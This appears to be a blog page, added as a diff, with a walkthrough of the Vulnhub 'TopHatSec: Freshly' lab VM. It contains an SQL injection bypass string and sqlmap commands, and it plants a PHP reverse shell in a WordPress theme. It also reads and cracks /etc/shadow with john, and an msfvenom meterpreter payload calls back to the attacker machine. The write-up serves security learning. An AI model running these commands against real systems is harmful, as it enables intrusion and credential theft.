@@ -1,0 +1,319 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>[Vulnhub]TopHatSec: Freshly  | F4l13n5n0w</title>
+
+<meta name="author" content="F4l13n5n0w"> 
+
+<meta name="description" content="This is a description"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	<link href='https://fonts.googleapis.com/css?family=Delius' rel='stylesheet' type='text/css'>
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
+<h4>Info Security & Pen Testing learning notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/about">瓷 | About</a></li>
+	<li><a href="/">段子 | Blogging</a></li>
+	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
+	<li><a href="/reading-list">藏♥品 | Reading</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/about">瓷 | About</a></li>
+	<li><a href="/">段子 | Blogging</a></li>
+	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
+	<li><a href="/reading-list">藏♥品 | Reading</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">[Vulnhub]TopHatSec: Freshly</h2>
+	<div class="entry-content"><p>&ldquo;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)
+There are a couple of different ways that you can go with this one. Good luck!&rdquo; &ndash; <a href="http://www.top-hat-sec.com/">TopHatSec</a></p>
+
+<p>&ldquo;VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.</a>&rdquo; &ndash; <a href="https://www.vulnhub.com/">VulnHub</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Links</h2>
+
+<p>watch video online:</p>
+
+<iframe src='http://player.vimeo.com/video/130604105?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>
+
+<p>Target: TopHatSec: Freshly (<em>10.10.10.134/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>login.php - SQL Injection Vulnerability</li>
+<li>weak/same passwords used</li>
+<li>/etc/shadow file world readable</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [Net Discover]</li>
+<li>Port scanned the target to discover the running services and open ports [nmap]</li>
+<li>Web information gathering and interacting with the web server [firefox]</li>
+<li>Web application scanned to dig more information about web service [nikto]</li>
+<li>Exploit SQL injection vulnerability and dump wordpress admin password [sqlmap]</li>
+<li>Upload PHP reverse shell and read /etc/passwd and /etc/shadow to greb sensitive information</li>
+<li>Use john the ripper for brute-force cracking to get root&rsquo;s password</li>
+<li>Generate and upload Linux meterpreter reverse shell and login as root with cracked password</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="http://sqlmap.org/">sqlmap</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80, 443 and 8080 have been discovered and the web server is apache 2.4.7 running on Ubuntu Linux.</p>
+
+<p>Due to only web services are found, I decided to use <em>nikto</em> firstly to dig more information on port 80 and got the following result:</p>
+
+<p><img class="left" src="/downloads/freshly/1.png"></p>
+
+<p>An login page has been found by <em>nikto</em> and I access <code>http://10.10.10.134/login.php</code> on firefox, it shows a login form with username and password input box.</p>
+
+<p>Simply try some weak passwords such as <code>admin/admin</code> and get <code>0</code> responded which means login failed.</p>
+
+<p>Then I tested simple SQL injection statements such as <code>' or 1=1 -- -</code> in username box and anything in password box, this time the server response <code>1</code> which means login successful.</p>
+
+<p>Based on the test result, I know here is SQL injection vulnerability.</p>
+
+<p>Now fire up <em>SQLMAP</em> to exploit it automatically.</p>
+
+<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --dbs</code></p>
+
+<p><img class="left" src="/downloads/freshly/2.png"></p>
+
+<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --smart --batch --dump -T users -D wordpress8080</code></p>
+
+<p><img class="left" src="/downloads/freshly/3.png"></p>
+
+<p>Here we are, the wordpress admin credential has been dumped:</p>
+
+<p><font color="red">admin / SuperSecretPassword</font></p>
+
+<p>Next, modify the pentestmonkey&rsquo;s PHP reverse shell' IP and port to my Kali&rsquo;s port 5555 and setup NC to listen on this port.</p>
+
+<p>Then by using the collected admin credential, I successfully logged in wordpress dashboard on server&rsquo;s port 8080.</p>
+
+<p>Then go to <code>Appearance --&gt; Editor --&gt; function.php</code>, delete all the content and paste the reverse shell&rsquo;s php code before &ldquo;Update File&rdquo;</p>
+
+<p>Now we got a shell with limited privilege. After poking around the file system, I read the passwd file which the secrets saved in the file too. Surprisingly, the shadow file also can be read.</p>
+
+<p>So dump the passwd and shadow file to my kali and add all found passwords (<em>SuperSecretPassword</em>) into the dictionary file (I use <em>rockyou.txt</em> here)</p>
+
+<p>Then use <em>john the ripper</em> to crack the hashes and got the following result:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo "SuperSecretPassword" > ~/tmp/dict.txt
+</span><span class='line'>cat /usr/share/wordlists/rockyou.txt >> ~/tmp/dict.txt
+</span><span class='line'>unshadow passwd.txt shadow.txt > unshadow.txt
+</span><span class='line'>john unshadow.txt --wordlist=~/tmp/dict.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="left" src="/downloads/freshly/4.png"></p>
+
+<p>Bingo! the root user use the same password as wordpress admin.</p>
+
+<p>In the meantime of cracking the passwords, I create and upload linux meterpreter reverse shell (<em>lmp443</em>) to target server in order to get a better interactive shell.</p>
+
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.131 LPORT=443 -f elf &gt; /var/www/lmp443</code></p>
+
+<p>Then set up Metasploit on my Kali to use exploit <code>php/meterpreter/reverse_tcp</code> and listen on port <code>443</code></p>
+
+<p>Then trigger the shell and get a meterpreter shell back to my Kali. Finally, use <code>su</code> command with cracked root password to get ROOT.</p>
+
+<p><img class="left" src="/downloads/freshly/5.png"></p>
+
+<h2>Appendix</h2>
+
+<p><strong>All passwords found/cracked:</strong></p>
+
+<p><strong>Wordpress password:</strong></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>admin / SuperSecretPassword</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>login.php password:</strong></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>candyshop / password
+</span><span class='line'>Sir / PopRocks</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>MySQL password:</strong></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>User password:</strong></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword
+</span><span class='line'>user / SuperSecretPassword
+</span><span class='line'>candycane / password</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+2015-06-13 04:57:26 -0400</div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/freshly/'>freshly</a>, <a class='category' href='/blog/categories/tophatsec/'>tophatsec</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
+
+    <font color="green">F4l13n5n0w</font>
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
